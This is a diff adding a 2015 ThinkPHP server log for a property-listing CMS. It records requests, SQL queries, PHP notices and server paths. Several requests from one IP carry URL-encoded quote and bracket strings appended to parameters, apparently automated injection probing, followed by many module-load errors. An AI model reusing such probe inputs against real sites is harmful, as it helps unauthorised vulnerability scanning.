@@ -1,0 +1,2756 @@
+[ 2015-10-14T01:00:45+08:00 ] 121.42.0.16 /
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001601s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001760s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.004982s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000219s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.029059s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002320s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.031466s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023004s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.054543s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.056125s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.057784s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.059083s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006074s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.060717s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001708s ]
+
+[ 2015-10-14T06:25:40+08:00 ] 121.42.0.14 /
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001577s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001758s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.005873s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000230s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.030784s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002059s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.032967s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021898s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.054930s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.056317s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.058000s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.059263s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005798s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.060824s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001599s ]
+
+[ 2015-10-14T11:54:08+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001580s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001721s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.144521s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000483s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000662s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.270179s ]
+INFO: [ view_template ] --END-- [ RunTime:0.043886s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.314151s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.222999s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.537222s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.538919s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.540542s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.541862s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007169s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.544654s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001801s ]
+
+[ 2015-10-14T11:54:21+08:00 ] 121.42.0.39 /?tools-products.html
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.002510s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002693s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.056847s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000406s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.093707s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002301s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.096092s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.030344s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.126549s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.128215s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.130034s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.131763s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006930s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.133556s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001898s ]
+
+[ 2015-10-14T11:54:23+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001616s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001754s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.073581s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000276s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.107804s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002342s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.110248s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.025784s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.136084s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.137527s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.139576s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.141278s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006823s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.143006s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001716s ]
+
+[ 2015-10-14T11:54:26+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001697s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001838s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.023156s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000581s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000261s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.077775s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002342s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.080199s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023803s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.104096s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.105589s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.107022s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.108246s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005952s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.110142s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001798s ]
+
+[ 2015-10-14T11:54:26+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000643s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000794s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.018716s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000352s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000214s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.055567s ]
+INFO: [ view_template ] --END-- [ RunTime:0.003018s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.058719s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.026307s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.085097s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.087033s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.088578s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.090220s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007772s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.092973s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002123s ]
+
+[ 2015-10-14T11:54:27+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:27+08:00 ] ERR: (ThinkException) 无法加载模块:Agent.(,"([""]'
+[ 2015-10-14T11:54:28+08:00 ] ERR: (ThinkException) 非法操作:loupanInfo).])].']."
+[ 2015-10-14T11:54:28+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo%29.%5D%29%5D.%27%5D.%22&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001598s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001743s ]
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  file D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [8] Undefined index:  line D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [4096] Object of class AgentAction could not be converted to string D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Array to string conversion D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+
+[ 2015-10-14T11:54:28+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD.%2C%5D%5D%5D%2C%2C%5B%27%29&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001458s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001597s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.014817s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000427s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000213s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.040091s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002342s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.042517s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.026594s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.069209s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.070820s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.072431s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.073754s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006134s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.075479s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002089s ]
+
+[ 2015-10-14T11:54:29+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594%28%28..%27%22%5B%5D%28%2C&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001644s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001821s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.035638s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000447s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000269s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.060775s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002717s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.063581s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.026135s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.089878s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.091618s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.093506s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.094826s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006491s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.096480s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001613s ]
+
+[ 2015-10-14T11:54:29+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline.%29%27%5D%2C%2C%5D%5B%2C%5B&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001538s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001708s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.031614s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000522s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000245s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.060228s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002172s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.062483s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019948s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.082508s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.083939s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.085361s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.086612s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005645s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.088256s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001611s ]
+
+[ 2015-10-14T11:54:30+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0%22%2C%27%22%28%29%22%22.%29
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001501s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001648s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.034411s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000484s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000256s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.058373s ]
+INFO: [ view_template ] --END-- [ RunTime:0.003034s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.061494s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.027106s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.088682s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.090259s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.091681s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.093786s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007092s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.095966s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002018s ]
+
+[ 2015-10-14T11:54:30+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:31+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:31+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:32+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:32+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:36+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:36+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:37+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:37+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:38+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:38+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:38+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:39+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:39+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:44+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:45+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:45+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:46+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:46+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:46+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:47+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:51+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:55+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:55+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:56+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:56+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:57+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:57+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:57+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:58+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:58+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:59+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:54:59+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:00+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:00+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:01+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:01+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:02+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:02+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:03+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:03+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:03+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:04+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:04+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:05+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:05+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:06+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:06+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:07+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:10+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:11+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:11+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:12+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:12+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:13+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:13+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
